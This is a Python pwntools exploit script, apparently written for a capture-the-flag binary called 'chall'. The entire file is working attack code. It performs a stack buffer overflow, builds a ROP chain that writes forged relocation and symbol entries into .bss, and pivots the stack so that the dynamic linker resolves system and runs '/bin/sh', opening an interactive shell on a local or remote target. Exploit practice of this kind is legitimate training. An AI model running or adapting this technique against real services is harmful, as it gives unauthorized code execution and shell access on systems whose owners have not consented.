#!/usr/bin/env python3
from pwn import *
 
BIN_FILE  = './chall'
LIBC_FILE = ''

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='i386')
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BIN_FILE)
    else:
        return process(BIN_FILE)
 
def attack(io, **kwargs):
    addr_base_stage = binf.bss() + 0x800
    addr_rel = addr_base_stage + 0x14
    addr_sym = addr_rel + 8
 
    addr_plt = 0x8049030
    addr_relplt = 0x80482d8
    addr_dynsym = 0x804820c
    addr_dynstr = 0x804825c
 
    rel_offset = addr_rel - addr_relplt
    align = 0x10 - ((addr_sym-addr_dynsym) % 0x10)
    addr_sym += align
    r_info = (((addr_sym - addr_dynsym) // 0x10) << 8) | 7
    addr_symstr = addr_sym + 0x10
    st_name = addr_symstr - addr_dynstr
    addr_arg = addr_symstr + 7
 
    base_stage = b'a' * 4
    base_stage += p32(addr_plt)
    base_stage += p32(rel_offset)
    base_stage += b'a' * 4
    base_stage += p32(addr_arg)
 
    rel = p32(binf.got.gets)
    rel += p32(r_info)
    rel += b'a' * align
 
    sym = p32(st_name)
    sym += p32(0)
    sym += p32(0)
    sym += p32(0x12)
 
    rop = ROP(binf)
    rop.gets(addr_base_stage)
    rop.gets(addr_rel)
    rop.gets(addr_sym)
    rop.gets(addr_symstr)
    rop.gets(addr_arg)
    rop.raw(rop.ebp)
    rop.raw(addr_base_stage)
    rop.raw(rop.leave)
 
    exploit = b'a' * 0x88 + rop.chain()
 
    io.sendline(exploit)
    io.sendline(base_stage)
    io.sendline(rel)
    io.sendline(sym)
    io.sendline(b'system\x00')
    io.sendline(b'/bin/sh\x00')
 
def main():
    io = start()
    attack(io)
    io.interactive()
 
if __name__ == '__main__':
    main()
